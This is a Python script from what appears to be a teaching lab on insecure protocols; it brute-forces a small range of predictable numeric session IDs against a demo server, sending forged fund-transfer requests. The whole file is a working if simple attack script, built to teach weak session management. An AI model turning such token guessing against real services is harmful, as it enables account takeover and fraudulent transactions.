# stage1_insecure_protocols/8_predictable_token/attacker.py

"""
attacker.py - Token Brute Force Attack Demonstration

This script performs a brute-force attack on a vulnerable server that uses
predictable session IDs for authentication. It attempts to guess a valid session ID
by iterating through a numeric range and submitting each as part of a forged request.

Vulnerability Demonstrated:
- Predictable session identifiers with no rate-limiting or account lockout.
- Lack of entropy or randomness in authentication tokens.
- No multi-factor or IP-binding checks on session validity.

Educational Purpose:
To highlight the dangers of weak session management and demonstrate how easily
an attacker can impersonate users if session IDs are guessable.

Usage:
    python attacker.py --port 9000
"""

import argparse
from config import DEFAULT_HOST
from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Brute-force a range of session IDs to find a valid token
for sid in range(123450, 123460):
    plain_text = f"session_id={sid}&action=transfer&amount=999999"
    print(f"\n[Attacker] Trying session_id={sid}")

    response = run_tcp_attack(
        host=server_host,
        port=server_port,
        plain_text=plain_text,
        payload=plain_text,
        verbose=False
    )

    if "✅" in response:
        print(f"\n[Attacker] Valid session ID found! Attack succeeded.")
        print(f"   Response: {response}")
